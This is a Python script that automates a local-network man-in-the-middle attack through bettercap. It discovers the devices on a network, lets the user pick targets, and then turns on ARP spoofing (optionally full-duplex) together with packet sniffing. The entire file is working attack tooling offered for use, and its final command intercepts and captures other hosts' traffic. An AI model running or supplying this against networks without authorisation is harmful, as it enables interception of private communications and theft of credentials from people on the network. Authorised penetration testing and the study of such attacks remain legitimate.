import subprocess
import sys
import time
import threading
import re

# this function starts the bettercap tool in the background.
def start_bettercap(iface):
    """Starts the bettercap process and returns the process object."""
    print(f"[*] Starting bettercap on interface {iface}...")
    try:
        # 'popen' runs the command in a new process.
        proc = subprocess.Popen(
            ["sudo", "bettercap", "-iface", iface],
            stdin=subprocess.PIPE,     
            stdout=subprocess.PIPE,    
            stderr=subprocess.STDOUT,  
            text=True,                 
            bufsize=1                   
        )
        time.sleep(2) # give bettercap a moment to initialize
        return proc
    except FileNotFoundError:
        # this happens if bettercap isn't installed.
        print("[!] Error: 'bettercap' command not found. Make sure it's installed and in your PATH.")
        sys.exit(1)
    except Exception as e:
        # catches any other errors during startup.
        print(f"[!] An error occurred while starting bettercap: {e}")
        sys.exit(1)

# this function finds devices on the network.
def discover_devices(proc):
    """Runs net.probe and net.show to discover and list devices."""
    devices = []
    output_lines = []
    stop_reading = threading.Event()

    # this little function reads bettercap's output in the background
    # so the main script doesn't get stuck.
    def read_output():
        while not stop_reading.is_set():
            line = proc.stdout.readline()
            if line:
                print(line, end="")
                output_lines.append(line)

    t = threading.Thread(target=read_output)
    t.start()

    # tell bettercap to start looking for devices.
    proc.stdin.write("net.probe on\n")
    proc.stdin.flush()
    print("[*] Device discovery started. Let it run for a bit to find devices...")
    # waits for the user to press enter before continuing.
    input("[*] Press Enter when you are ready to see the list of discovered devices...\n")

    # tell bettercap to stop probing and show the list of found devices.
    proc.stdin.write("net.probe off\n")
    proc.stdin.flush()
    time.sleep(1)
    proc.stdin.write("net.show\n")
    proc.stdin.flush()
    time.sleep(2) # wait for the list to be printed.

    stop_reading.set()
    t.join()
    
    # this is a pattern to find ip, mac, and name from the output text.
    device_regex = re.compile(r"^(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(?P<mac>([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+(?P<name>.*?)\s+(?P<vendor>.*?)\s+.*")
    
    print("\n--- Parsing Discovered Devices ---")
    # goes through each line of the output to find devices.
    for line in output_lines:
        match = device_regex.match(line.strip())
        if match:
            device_info = match.groupdict()
            devices.append(device_info)
    
    # if no devices were found, exit the script.
    if not devices:
        print("[!] No devices were found. Exiting.")
        proc.terminate()
        sys.exit(1)

    return devices

# this function shows the list of devices and asks the user what to do.
def get_user_choices(devices):
    """Displays devices and gets the user's target and fullduplex choices."""
    print("\n[+] Discovered Devices:")
    # prints each found device with a number.
    for i, device in enumerate(devices):
        print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']:<17} Name: {device.get('name', 'N/A')}")

    # keeps asking until the user enters a valid number.
    while True:
        try:
            target_indices_str = input("\n[*] Enter the number(s) of the target(s) (e.g., 0 or 1,3): ")
            target_indices = [int(i.strip()) for i in target_indices_str.split(',')]
            
            # checks if the numbers are valid.
            if all(0 <= index < len(devices) for index in target_indices):
                selected_ips = [devices[i]['ip'] for i in target_indices]
                targets_str = ",".join(selected_ips)
                break
            else:
                print("[!] Invalid selection. Please enter number(s) from the list above.")
        except ValueError:
            print("[!] Invalid input. Please enter numbers only.")

    # asks the user if they want to run a full duplex attack.
    while True:
        choice = input("[*] Enable full-duplex ARP spoofing? (y/n): ").strip().lower()
        if choice in ['y', 'yes']:
            fullduplex = "true"
            break
        elif choice in ['n', 'no']:
            fullduplex = "false"
            break
        else:
            print("[!] Invalid choice. Please enter 'y' or 'n'.")
            
    return targets_str, fullduplex

# this function runs the actual attack commands in bettercap.
def run_attack(proc, targets, fullduplex):
    """Constructs and sends the final attack command to bettercap."""
    # puts together the final command based on user choices.
    command = f"set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {targets}; arp.spoof on; net.sniff on"
    print(f"\n[+] Executing command: {command}")
    # sends the command to the running bettercap process.
    proc.stdin.write(command + "\n")
    proc.stdin.flush()
    print("\n[***] ARP spoofing and sniffing started! Press Ctrl+C to exit. [***]")

    # shows the live output from bettercap.
    try:
        while True:
            line = proc.stdout.readline()
            if not line:
                break
            print(line, end="")
    except KeyboardInterrupt:
        # stops the script when the user presses ctrl+c.
        print("\n[*] Stopping bettercap and exiting...")
        proc.terminate()
    except Exception as e:
        # catches any other errors.
        print(f"\n[!] An error occurred: {e}")
        proc.terminate()

# this is the main function that runs everything in order.
def main():
    # checks if the user provided a network interface name.
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <network_interface>")
        sys.exit(1)
    iface = sys.argv[1]

    # step 1: start bettercap.
    proc = start_bettercap(iface)
    if not proc:
        print("[!] Failed to start bettercap. Exiting.")
        sys.exit(1)
    # step 2: discover devices on the network.
    devices = discover_devices(proc)
    if not devices:
        print("[!] No devices found. Exiting.")
        proc.terminate()
        sys.exit(1)
    # step 3: ask the user for attack details.
    targets, fullduplex = get_user_choices(devices)
    # step 4: run the attack.
    run_attack(proc, targets, fullduplex)

# this line makes sure the main function is called when the script is run.
if __name__ == "__main__":
    main()
